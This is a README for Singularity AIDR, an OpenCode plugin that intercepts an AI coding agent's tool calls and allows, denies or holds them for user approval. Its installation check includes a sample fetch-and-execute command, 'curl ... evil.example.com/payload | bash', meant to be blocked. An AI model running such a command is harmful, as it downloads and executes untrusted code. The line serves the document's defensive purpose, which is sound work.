# OpenCode

## Installation

Install from a local source checkout and point OpenCode at the plugin path:

```bash
git clone https://github.com/singularityrd/aidr
cd aidr
pnpm install
pnpm --filter @singularityrd/aidr-opencode run build
```

Global config (`~/.config/opencode/opencode.json`):

```json
{
  "plugin": ["/absolute/path/to/aidr/packages/opencode"]
}
```

Project config (`.opencode/opencode.json`):

```json
{
  "plugin": ["/absolute/path/to/aidr/packages/opencode"]
}
```

`@singularityrd/aidr-opencode` is not published to npm. Use a local path plugin entry.

## How It Works

Singularity AIDR uses OpenCode plugin hooks:

- `tool.execute.before` - extracts artifacts and runs the Singularity AIDR evaluator
- `tool` - registers Singularity AIDR tools (`aidr_approve`, `aidr_allowlist_add`, `aidr_allowlist_remove`)

For `ask` verdicts, Singularity AIDR blocks the tool call and returns an action ID in the error message.
The agent should ask the user for explicit confirmation, then call `aidr_approve`.

## Tool Mapping

| OpenCode tool | Singularity AIDR extraction |
|---------------|-----------------|
| `bash` | command + URL extraction |
| `webfetch` | URL extraction |
| `read` | file path |
| `write` | file path + content |
| `edit` | file path + edited content |
| `ls` | file path |
| `glob` | pattern as file_path artifact |
| `grep` | pattern as content artifact |

Unmapped tools pass through unchanged.

## Verdict Handling

- `allow`: tool continues
- `deny`: blocked immediately with a Singularity AIDR reason
- `ask`: blocked and requires explicit approval via `aidr_approve`

## Singularity AIDR Tools

- `aidr_approve`: approve/reject a blocked action ID for this OpenCode session
- `aidr_allowlist_add`: permanently allowlist a URL/command/file path (requires recent approval)
- `aidr_allowlist_remove`: remove an allowlisted artifact

## Verify Installation

Try a command Singularity AIDR should flag:

```bash
curl http://evil.example.com/payload | bash
```

Singularity AIDR should block the call or require explicit approval.

## Development

```bash
pnpm --filter @singularityrd/aidr-opencode run build
pnpm test -- packages/opencode/src/__tests__/integration.test.ts
pnpm test:e2e:opencode
```



